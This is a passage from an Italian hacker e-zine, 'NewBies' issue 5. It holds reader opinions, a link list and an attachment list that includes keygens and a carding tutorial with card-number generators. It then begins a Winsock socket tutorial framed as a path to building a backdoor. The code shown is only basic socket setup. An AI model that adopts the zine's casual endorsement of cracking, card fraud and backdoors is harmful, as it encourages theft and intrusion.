gia' il volerci provare..
e' una cosa buona..
fregatene di cio' che altri..
possono dire..
e ricorda..
parecchi sono solo fumo e niente arrosto
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY Master
Il pensiero spassionato di Master su Newbies:

Da quando e' nata la comunicazione tra le genti c'e' stata la necessita di
scrivere le proprio esperienze su un supporto che fosse meno labile e piu'
fruibile della memoria personale.
Da allora tutti scriviamo cercando di essere per quanto possibile sopra le
righe e infatti  spesso si misura l'abilita' di un scrittore anche in base
al coraggio col quale propone le sue idee.
Newbies e' una rivista fatta da persone che propongono pubblicamente e
gratuitamente le loro esperienze al fine di poter dare un aiuto agli altri.
Spesso si puo' intravedere una motivazione finale distruttiva in alcuni
articoli tanto da citare quegli specifici brani di lameraggio, in altri casi
si va sullo squisitamente tecnico ed in altri si rasenta il comico per
l'assoluta distanza dal mondo hacking etico.
Ma del resto il termine Newbies cosa significa del resto ? .. significa
'pivello hacker' .. pivello nel senso migliore del termine. Il pivello
hacker e quello che ancora non sa esttamente tutto ma ha una grande voglia
di imparare. Il Pivello hacker e' quello che mette a nudo le proprie
inesperienze per cercare di confrontarsi con altri al fine di migliorare se
stesso. E' anche quello che a volte sbaglia ma che poi dall'errore ne trae
spunto per non incorrere successivamente nelle stesse metodiche errate.
Insomma un curioso a 360 gradi.
Newbies e' appunto cosi'.. curiosa e varia come vario e' il mondo
dell'hacking..o meglio come varia e' la vita. Facendo un paragone con altre
riviste tipo Netrunner o Bfi si potrebbe asserire che newbies ogni tanto
oltrevarica i limiti del consentito e del lecito. Questo puo' essere.. cmq
sempre nell'ambito della discussione accademica. Nessuno finora puo'
asserire (ne lo potra' mai) che sia mai stato esercitato  un qualunque
invito esplicito alla illegalita' .. ogni articolo e' solo il tentativo di
mettere in risalto con considerazioni e prove, piu'  o meno esplicite, bug e
malfunzionamenti di determinati sistemi.. lo scopo finale non e' ne vorra'
mai essere l'utilizzo di questi bug per l'ottenimento di un ricavo personale
ma solo un sistema per l'accrescimento della cultura personale attraverso lo
studio metologie tecniche e il conseguente tentativo di miglioramento dei
sistemi stessi. Non si confonda poi lo spirito goliardico col quale vengono
scritti alcuni articoli con altre cose inesistenti. Newbie e' una strumento
che promette o incita ma solo un qualcosa di gratuito e sofferto che un
insieme di persone di varia eta' ed estrazione sociale (veramente varia!)
cercano di comporre unendo i loro sforzi.
La lettura non e' obbligata .. la bellezza di cio' che e' pubblico risiede
anche in questo: la dove non si offende nessuno si puo' sempre decidere a
priori di non leggere ulteriormente cio' che non ci piace!
Se invece qualche articolo sara' stato di vostro gradimento o di una qualche
utilita'.. beh .. allora ogni singolo sforzo ed ogni singolo goccia di
sudore delle persone che hanno contribuito alla stesura della rivista sara'
stato riccamente ricompensato. ;-)
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY ANONIMO
per me, visto a chi e' rivolto ... va piu' che bene....
poi mi sembra che se qualcuno volesse leggere qualcosa di meglio.....
e' libero di andare da qualche altra parte... o no?
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY LordFelix
allora ti faccio una cosa sintetica qui
secondo me ci sono due tipi di persone che possono criticarvi
quelli che si spacciano per "grandi hacker" e che quindi credono
di poter ammettere di leggere solo bfi per non rovinarsi "la piazza"
oppure qualche guru nel vero senso della parola che non vuole perdere tempo
con cose che gia' sa dato che credo che per uno della seconda categoria ce
ne sono 1200 di quelli della prima.... beh... non posso che farti i migliori
auguri per i prossimi 50 numeri
Personalmente trovo la rivista ben fatta e godibile anche da chi newbie (si
spera) non lo e' piu'
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY ANONIMO
Nobody88 mi ha chiesto di scrivere il mio parere sulla rivista Newbies
e devo ammettere che mai mi e' successo di "giudicare" una rivista,
piu' che altro perche' non mi sento di essere un lettore "tipo" di 
Newbies. Bene accetto la req scrivo qualcosa, che poi avevo gia'detto
all'ottimo Nobody88 in quel dello Smau.
Newbies e' nata per colmare quel target di gente della situazione 
italiana che sa 'qualcosa', e' alle prime armi, ai primi telnet e 
rlogin e alle prime righe di codice, ma necessita di piccoli input.
La zine ha quindi l'importante obbiettivo di condividere le informazioni.

INFORMATIONS MUST BE FREE!

Quando una persona si crede cosi' Elite da dire che Newbies e' una 
zine Lame, vuol dire che non ha capito nemmeno il significato della 
parola lame. Per lame si intende colui che vuole imparare tutto e 
subito e cerca di rompere le palle alla prima persona che ritiene 
piu' "esperta" di lui. Una zine che di per se si dichiara NEWBIE 
vuol dire che raccolgie un gruppo di persone non molto esperte, ma,
a parer mio, una grande dote, la voglia di imparare, di farsi
letteralmente il culo e non di ridursi a chiedere
TUTTOQUELLOCHESIDEVESAPERE al primo tipo che gli capita a tiro.
I newbies chiedono qualche consiglio per correggere le
loro lacune e reindirizzare meglio la loro ricerca, i lame
spaccano le scatole  e basta. Naturalmente non sto affatto cercando di
classificare nessuno, ho solo dato la mia opinione, siete liberi di
fregarvene, di prenderne atto o di condividerla, non importa :P
L'importante e' riflettere!

Buon Lavoro NewBies	Anonimo

Ps: Adulare e' la peggior strada per ottenere informazioni.
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY rwxrw-r-x
<N0bodY88> che ne pensi di newbies?
Beh, io sono una persona che nella vita si smazza parecchio per ottenere
quello che vuole, in rete ho sempre trovato poca roba, e allora mi sono
sempre dovuto buttare su inutili riviste giornalistiche (anche se non tutte),
e sui manualoni di Unix e di C per cominciare a capire qualcosa Poi in rete
a mala pena ti danno retta, ti devi solo e soltanto smazzare da solo per
riuscire a capirci. Molta gente inoltre se la tira per quello che sa, quando
ha capito qcs ed e' riuscita ad ingranare nel verso giusto, cominciano a darsi
un po' di rispetto.
La prima rivista che veramente ha significato qcs per me e per il mio pc e'
stata BFi, sicuramente Newbie non puo' essere paragonata a quei livelli, ma
all'interno di essa c'e' gente che ci lavora e che crede in cio' che fa.
Credo sia giusto aiutarsi e scambiarsi idee ed esperienze , questo e' l'unico
modo per riuscire ad ottenere veramente qualcosa.
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY Ergoline
a me personalmente piace
ma mi pare inutile
mettersi a discurtere con certa gente
cioe'... io apprezzo chi "fa"
e non si limita a criticare per il gusto di farlo
voi siete gente che fate.. loro invece mi sa che parlano solo
e non sanno apprezzare il vostro impegno
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY A-SyNcHr0
una cosa interessante, molto utile per chi ha delle curiosita' e vuole
imparare di piu' e magari rimane un po' spaventato leggendo bfi. Solo in
alcuni articoli cala un po' il tono
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY ANONIMO
decente e-zine...purtroppo spesso dal basso livello tecnico...ma e' un e-zine
fatta da newbie per newbie...quindi e' logico che lo sia
MIIIIIIITICAAAAAAAAAaaaaaaaaaa
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY F4lc0n
newbies e' una bella ezine, fatta appunto per chi sta imparando nel mondo
dell'hacking...
certo non e' l'unica sul mercato e fa una bella concorrenza alle altre +
famose non so, tipo netrunners o bfi
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY Ritz
Dunque... secondo me attualmente newbies e' una rivista bene organizzata, ci
sono varie persone che collaborano, e penso che sia una bouna zine.
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY ANONIMO
lo diko a te, perke` ti konosko e non mi sembri una mala persona
ma un qualsiasi lamerino che mi viene a chiedere ma perke` dici cosi`?
ma lo fai perke` sei piu` bravo kome m`e` gia` kapitato, that`s not funny :)
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY Spark
e' una rivista "educativa"
impari, divertendoti
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY M4VER1CK
E' un'ottima rivista x ki vuole imparare....
senza paroloni....
e molto efficacie....
giusto x ki vuole imparare...
ekko tutto :)
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY XaRaBaS
beh........... NEVER MIND!
ti va sta risposta? :-D
Newbies e' x sempre
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY DEVILNET
credo che nb sia l'ezine migliore x chi inizia
tutti amici
ogni articolo
serve a condividere ogni esperienza
di hack crack ph
la trovo molto interessante
proprio x la semplicita' e cmq
il fatto che possa anke io pubblicare articoli
mi fa sentire in una famiglia :)
siamo tutti amici 
uniti tutti da una stessa passione
NB E' IL MEGLIO !!
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY [LiQUID]
che e' una gran topa di ezine =)
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY BlakDruiD
dato che c'e' un mio articolo, newbies e' una figata...:)
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY Yoda100
Grande
rivista
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY r3b0oT
e' bella l'idea che venga scritta da newbies 
e che spazi in un po' tutti i campi...
non solo nell'hacking
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY YAGO
Di newbie penso che sia uno strumento utile a chi inizia e anche a chi c'e
gia' dentro internet.
Inoltre diffondere informazione e' un opera importante in qualsiasi campo
dove c'e' la chiusura in corporazioni
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY THE INTRUDER
che era cio' che mancava... mi spiego:
altre e-zines tipo Bfi
sono ugualmente belle,
ma per chi e' alle prime armi o
vuole imparare sono un po' troppo difficili..
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY Spymaster
beh penso semplicemente ke ci sono alkuni artikoli ke non rientrano nella
kategoria newbies ma lamer
si dovrebbe un po' alzare in tiro
es. potrebbe essere fare un art sull'uso di dselect oppure kesso' kome kreare
un vhost
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY Teresa Canis
guarda solo per il fatto che e' curata e aggiornata il mio giudizio e' ottimo !
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY Aladar
mi sembra una bella iniziativa, anche se in questo periodo non mi sto
dedicando molto all'hacking e co.
Sono un po' incasinato. Comunque e' bene che queste ezines esistano
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
By Darkman
be' che dovrei dire?... considero il lavoro che fate... cioe'... tutta quella
quantita' di Kb che pubblicate, si vede che ci mettete impegno, inoltre gli
argomenti trattati mi sembrano molto interessanti ed abbastanza completi.
continuate cosi' =)
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY Biavo
i newbies sono un gruppo interessante, alcuni di loro hanno buone idee
(si deduce da alcuni articoli) e voglia di imparare, peccato che la maggior
parte di loro dopo un po' si stanca e non continua questa sua passione.
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY Vaffa
newbies?????''' chi la conosce l'ama chi non la conosce si suicidia
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY [aLT255]
secondo me
e' un'ottima e-zine
nel senso
personalmente mi piacciono molto le sezioni dedicate alla programmazione
molto ben curate
e poi quelle dell'hacking.. pero' purtroppo io so ancora a far prendere
tin.it al mio redhat che non ne vuole sapere...
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY Cod
ok all'inizio pensavo che fosse una delle tante riviste
che si trovava in giro.... infatti guardandola
non e' che la trovassi interessante...
poi pero' mentre leggevo
un articolo di crack dell ZioFill
mi sono interessato al giornalino ;)
.... pero' quando mi so accorto che lo zio e' pejo de me mi so detto
meglio dare na mano... ;) senno' qui quando la smettono di fare newbies !
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY Urkes
newbies e' una delle classiche e-zine da far leggere a quelle persone
esordienti nell'hacking ovvero ai newbies
talvolta puo' essere d'aiuto anche per esperti visto che negli articoli puo'
apparire qualcosa di nuovo
ma di solito l'indirizzamento di chi smanetta e' orientato verso cose piu'
che fanno venire l'ebbrezza hacker ovvero il pluricitato BfI, Phrack, e cosi'
via
Se continua verso il miglioramento potremo trovare in newbies 'l'ezine della
porta accanto'
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY Vecna
newbies va' migliorando di brutto! se il primo e il secondo numero erano a
dir poco "patetici" :) (anche se in fin dei conti il titolo e' "NEWBIES" ) il
terzo e il quarto numero lasciano intravedere anche un pochino di tecnica, e
questo e' un grande passo, sopratutto xke' gli autori degli articoli sono
anche gli autori di newsbies 1 e 2. questi significa che
1) loro stessi sono migliorati
2) newbies, almeno come introduzione, vale. ... se poi ci sono gli art non
   sintattici ma tecnici... bhe, bisogna essere sicuri di sapere le cose
   prima di scriverle :)
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY Bobo
guarda che come e-zine la considero una delle migliori:)
mi piace molto
quella che preferisco e' bfi
poi netrunners di rigor
poi ci siete voi con newbies
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY _JoHnNy-
newbies
e' una bella rivista
ma...
credo che la veste grafica sia molto scarsa
e anche il fatto che sia un solo file
e' difficile da consultare!!
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY \ImRsTv\
ke sia un'ottima trovata......
bfi non e' assolutamente x gente ke vuole imparare....
mentre Newbies tratta argomenti in modo facile.....
mi pare ke il vostro skopo fosse kuesto no ?
beh se e' kosi' lo state assolvendo in pieno.....
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר
BY ANONIMO
hm.... come rivista non e` malaccio
רררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררררר

                                                        N0bodY88

SPECIAL TNX: vanno a tutti quelli che si sono presi la briga di rispondermi
             togliendo tempo prezioso a cose forse (di sicuro!!!) piu' utili
             che rispondere a un newbies in cerca di certezze ;)

NOTA DI N0bodY88 A QUEL GRUPPO DI PERSONE: voi che cax state facendo x cercare
                                           di aiutare gli altri o di creare
                                           qualcosa di nuovo ?
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

          ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
          ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
          ÷³           RIEPILOGO LINK IN ORDINE ALFABETICO         ³÷
          ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
          ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

[ Anarchy in the system ---------------------------> http://aisprod.tsx.org ]
[ Attila Hack ------------------------------> http://www.attilahack.cjb.net ]
[ Crypto -----------------------------------------------> http://kz.cjb.net ]
[ BFI ------------------------------------------> http://www.s0ftpj.org/bfi ]
[ Dislessici -----------------------------------> http://www.dislessici.org ]
[ Lord Guf --------------------------------------------> http://guf.cjb.net ]
[ Metro Olografix -------------------------------> http://www.olografix.org ]
[ NetRunners -----------------> http://www.spippolatori.com/h/netrunner.htm ]
[ Quequero ---------------------------------------> http://quequero.cjb.net ]
[ RFC (sito dove le potete trovare) ------------> http://www.faqs.org/rfcs/ ]
[ RingZ3rO ---------------------------------------> http://ringzer0.cjb.net ]
[ Softpj -------------------------------------------> http://www.s0ftpj.org ]
[ SoftWord -----------------------------------> http://softword.webjump.com ]
[ Spaghetti Phreakers -----------------> http://come.to/spaghettiphreakers/ ]
[ Spippolatori -------------------------------> http://www.spippolatori.com ]
[ T0rment0 -------------------------------> http://web.interpuntonet.it/xj/ ]
[ Vana - Imago -----------------> http://members.xoom.com/eripper/index.htm ]
[ Valvoline -------------------------------------> http://valvoline.cjb.net ]
[ Wannabe ----------------------------------> http://www.attilahack.cjb.net ]

NOTA DI N0bodY88 = Se volete che il nome della vs crew con l'url del vs sito
                   sia presente nella soprascritta tabella basta che ce lo
                   comunichiate e sara' fatto sia x siti newbies che x siti
                   di hacking. Un grande scusa va agli amici del s0ftpj x il
                   fatto di avere messo in NewBies 4 il link al loro sito
                   sbagliato (errore prontamente segnalatomi dal mito Vecna).
                   Mea culpa :( Scusatemi ancora.

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°²°°°°°°°°°°°°°°°°°²°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

2 PAROLE SUGLI ALLEGATI:

- 3s7km.zip = contiene un exe che e' il keymaker del prog Tresette fatto
              dal solito inimitabile cod :)

- articoli newbies e-zine.zip = raccolta in un indice fatto in excel di tutti
                                gli art dei num precedenti di NewBies fatta
                                da ego2k e passatami...complimenti x l'idea :)

- bpkm.zip = contiene il keymaker di Buddy Phone fatto da cod in soli 9 kb...
             che dire... complimenti al ns veterano ;)

- card-tut.zip = carding tutorial composto dalla guida di XaRaBaS al carding,
                 Crad Master 4, GenCCard e il mitico GenerID dei bieffeiani
                 Cavallo de Cavallis (IL crackatore) e Blinking (mi sono
                 giunte voci sul fatto che sia meta' uomo e meta' kernel di
                 linux!!!)

- html.zip = zip contenente la guida ai fondamenti dell'html di Firebeam divi
             sa in un file contenente la guida vera e propria, una pagina con
             un listato, una pagina di prova ed un immagine di prova

- Nr-gsm.zip = contiene la strafiga guida al sistema gsm fatta dal ineguaglia
               bile Nick1 un must x tutti i phreaker, x tutti gli aspiranti
               phreaker e per tutti i dipendenti telecom che ci seguono =)

- RFC 1459 1ר parte = traduzione di una buona parte del RFC 1459 che spiega
                      il protocollo IRC (le prossime parti nei prossimi nume
                      ri). Complimenti al traduttore il simpaticuz [Ironman]

- writing = ovvero l'articolo "La dura arte del writing" di r3b0oT x aiutare
            i novelli artisti amanti dell'hip hop, xche' se e' vero che
            hacking non e' solo smanettare sui pc ma anke uno stato mentale..!

...non rimane che...

- NewBies5.txt = cosa pensate che sia 8-] hihihi

                                                             N0bodY88

ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ                                                                                  
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
²°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°°²
ֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿֿ

   ֹֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ»
   ÷ִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ¿÷
   ÷³ LA PROGRAMMAZIONE DEI SOCKET AD USO ED ABUSO DEI CEREBROLESI  :)  ³÷
   ÷ְִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִִ÷
   ָֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽֽ¼

    -= Master *** =-
     Spp - Member
 Master@spippolatori.com
  www.spippolatori.com 

  Per la prima volta nella tua vita dopo tanta programmazione in vb o in c++
  ti sei deciso a fare qualcosa che mandi o riceva qualche dato attraverso la
  grande rete e da una prima lettura delle specifiche dei socket ti senti un
  cerebroleso?
  Sei passato dal c++ alla lettura di "ricordi dal sottosuolo" di Dostoevskij
  ma anche li c'hai capito pochino quindi sei tornato a incaponirti sul c++
  seguendo lo schema pratico secondo il quale se non ti fai del male non sei
  contento?

  Non ti angustiare ..e' una cosa molto piu' comune di quanto non pensi. ;-)

  <modo PENSIERO ON>
  Certo sarebbe bello potersi fare una backdoor da solo ma.. azz.. chissa'
  com'e' difficile, c'e' un sacco di termini che non capisco, gli help del
  winsock sono pieni di esempi che uno per capirli deve gia' essere un
  esperto .. e allora che esempi sono?
  Poi mi dovrei leggere anche qualche RFC .. in inglese!!.. va beh .. forse
  e' meglio se torno ad accendere e spegnere computer come mia attivita'
  principale.
  Pero' .. mmhhhh.. forse potrei scopiazzare il programma di un altro e
  modificarlo leggermente cosi' dopo faccio credere a tutti che sia il mio!
  he he si si .. faro' cosi'.
  Pero' si trova solo roba per unix.. e chi ci capisce nulla! sob! .. che
  depressione.
  <modo PENSIERO OFF>

  ALLEGRO! .. he he .. ecco qui una serie di procedure ad uso ed abuso di un
  cerebroleso come te per poter fare le seguenti cose..

  1. La programmazione base del winsock in c.
  2. Esempi pratici elementari in c++: 
             time server, 
             smtp, 
             estrazione di tutti gli indirizzi, ip o altri header da un ng
             Applicazione minima client-server per l'esecuzione di programmi
             sul remoto
             ... ed altro. ;-)
  3. Convertire un programma in C per unix che sfrutta i socket in un
     programma funzionante per windows.

  [..ci sono anche svariati esempi in VB parallelamente a quella in C ;-) ]

  Le cose da ricordare sono semplici ..
  per comunicare o ricevere dati attraverso la rete col C e' necessario
  possedere una libreria di istruzioni (facente capo ad una dl specifica) che
  prende il nome di WINSOCK.
  La trovate come libreria BAS nel VB (WINSOCK.BAS) e come header nel C
  (WINSOCK.H)
  Se usate il VC dalla versione 4 in su o il Borland C++ dalla versione 4.5
  in su (Builder compreso) questa libreria e' gia' all'interno della vostra
  installazione..  deve solo essere dichiarata come header.
  Il Borland c++ 3 (quello che poi quasi tutti usano come primo compilatore)
  non ha questa libreria. Si trova in rete su vari siti .. ma di quelle
  proposte non ne funziona una. Per usare i Socket col Borland c++ l'unica
  soluzione valida resta quella di installarsi il Trumpet Winsock (si trova
  in rete col crack annesso).

  La libreria contiene una marea di funzioni spesso inutili per chi inizia.
  Le uniche che vi serviranno sono quelle relative ai seguenti passi minimi
  necessari per:

  1. Aprire un socket (e' come alzare la cornetta del telefono.. si crea il
     presupposto per una connessione con un altro utente)

  2. Chiudere un socket (la dovrete riabbassare prima o poi la cornetta no?)
 
  3. Mandare dei dati (solitamente una stringa di testo)

  4. Ricevere dei dati (solitamente una stringa di testo)

  5. Attendere in perpetuo che qualcuno ci mandi dei dati
     (e' la base per fare un "server" .. ovvero un programma che attenda un
      qualche dato caratteristico da un client remoto per poi fare - qualcosa
      d'altro -)

  Se sapete fare questo tutto il resto praticamente non vi serve.

  Tenete sempre presente che lavorare con i socket e' un po' come aprire
  telnet e lavorare di li.
  Su telnet vi connettete (con i socket dovete fare altrettanto).
  telnet apre un socket per la connessione (questo invece voi dovrete farlo a
  mano) poi inviate i comandi scrivendoli sulla consolle e premendo enter.
  Con i socket dovrete mettere i comandi in una stringa di testo, inviarli
  col comando apposito assieme ai caratteri finali ascii(13) +ascii(10) che
  sono l'equivalente del premere ENTER.
  Di seguito leggete su telnet le risposte. Col winsock dovranno essere
  espressamente richieste tramite una funzione apposita.
  Finito il lavoro chiudete telnet il quale chiude per voi i socket aperti.
  Con winsock sarebbe molto carino se i socket ve li chiudeste da soli..
  infatti solo chiudendo il programma spesso questi ultimi restano aperti
  lasciandovi delle porte occupate ..almeno fino al prossimo riavvio di
  windows.

  Vediamo come si fa in pratica..

  Come prima azione dovremo aggiungere ai nostri programmi in C gli header
  necessari...  a questi visto che intenderemo lavorare con i socket
  aggiungeremo
 
  #include <winsock.h>

  COSA IMPORTANTE DA RICORDARE.. il winsock DEVE essere inizializzato per
  funzionare!

  per farlo bisogna creare una variabile di tipo WSData (attenzione alla
  maiuscole e alle minuscole!)
  - Ma io non ce l'ho sto tipo di variabile!!-
  Si si .. ce l'avete! ..he he .. e' dichiarato nell'header winsock.h!

  Dopo di che si usa la funzione WSAStartup in questo modo

  WSAData parto;
  long identificatore
  ....
  identificatore=WSAStartup(0x0101,&parto);

  .. il winsock e' partito! :))


  adesso bisogna -alzare la cornetta del telefono- .. ovvero aprire un socket.

  b = socket(AF_INET,SOCK_STREAM,0);
 
  (b e' l'identificatore che vi dice se i l socket e' stato aperto o meno ..
   tipo INT)
  (consideriamo il caso che si apra un socket per la comunicazione via TCP..
   per usare i socket ICMP o UDP le dichiarazion idi apertura sono diverse..
   ma il TCP per adeso a voi basta e avanza) 

  Bisognera' ora dichiarare di volersi collegare ad un determinato IP su una
  certa PORTA.
  (Ovviamente e' necessario che l'ip sia esistente e on line per riuscirci
  ..e che ovviamente abbia quella determinata porta aperta.)
  
  I dati da passare al winsock devono essere contenuti in una struttura di
  tipo sockaddr_in (sockaddr_in significa indirizzo in entrata per il socket)

  quindi:

  struct sockaddr_in pippo   (per definire la struttura.. il tipo sockaddr_in e' sempre
                              contenuto nella libreria winsock.h)

  e di seguito

  ...

  pippo.sin_family = AF_INET;
  pippo.sin_port = htons(numero_della_porta);
    (serve a dichiarare su quale porta ci si vuole connettere)
  
  pippo.sin_addr.s_addr = inet_addr(IP_in_formato_stringa);
    (serve a dichiarare a quale IP ci si vuole connettere)

   una sola precisazione importante.. inet_addr e' una funzione che permette
   di convertire un ip in formato canonica sotto forma di stringa nel suo
   equivalente numerico.

   es.  IP = "100.200.300.400"  inet_addr = 400+300*256+200*256^2+100*256^3

   quindi 1690829500 e' l'equivalente decimale di 100.200.300.400

   potete provare questo sostituendo uno all'altro quando vi connettete con
   telnet (funzionano entrambi ..sono lo stesso numero rappresentato in
   maniera matematicamente diversa)

   Tutto chiaro?  perfetto. ;-)

   come? .. scusa ? .. -Ma se io conosco solo l'equivalente letterale dell'IP
   come faccio?-

   beh .. e' leggermente piu' laborioso ma non piu' complesso. ci viene in
   aiuto la comodissima funzione "gethostbyname" ... magico eh!? ;-)
   gethostbyname ..ovvero trova l'ip del server tramite il suo nome letterale.
   per usarla occorrera' inizializzare una struttura di tipo hostent:

   struct hostent *hp

   inizializzarla con i dati relativi al resolve numerico del nome del server.

   hp=gethostbyname("nome_del_server")   (es: nome_del_server =
   "wwww.spippolatori.com")

   e quindi modificare la linea di ingresso che prima avevamo scritto cosi':

    pippo.sin_addr.s_addr = inet_addr(IP_in_formato_stringa);
   
   cosi':

    pippo.sin_addr.s_addr = ((struct in_addr *)(hp->h_addr))->s_addr;

   ...........
  
   arriva la parte piu' importante.. bisogna CERCARE DI CONNETTERSI!

   lo faremo con l'istruzione  "connect" ..ma guarda te. ;-)
   usando questa sintassi:

   d=connect(b,(struct sockaddr *)&pippo,sizeof(pippo));

   d e b sono i soliti identificatori di tipo INT, pippo e' la struttura sopra
   inizializzata che passa i dati al winsock per l'effettiva connessione.

   Se tutto va bene .. siamo connessi! 

   Che fare adesso?

   potremo inviare dei dati o ricevere dei dati.

   Solitamente i server ad ogni invio di dati replicano con una stringa di
   risposta per confermare l'avvenuta operazione o per informare che qualche
   errore e' occorso.

   Per inviare i dati si usera' il comando send, per riceverne il comando
   recv con queste rispettive sintassi:

    send(nome_del_socket_aperto , stringa , lughezza_della_stringa , 0);

    recv(nome_del_socket_aperto , stringa , lughezza_della_stringa , 0);

    esempio pratico di invio:

    Vogliamo inviare al server la stringa "MAIL FROM: me@too.it" + l'invio
    (ENTER)

     ...
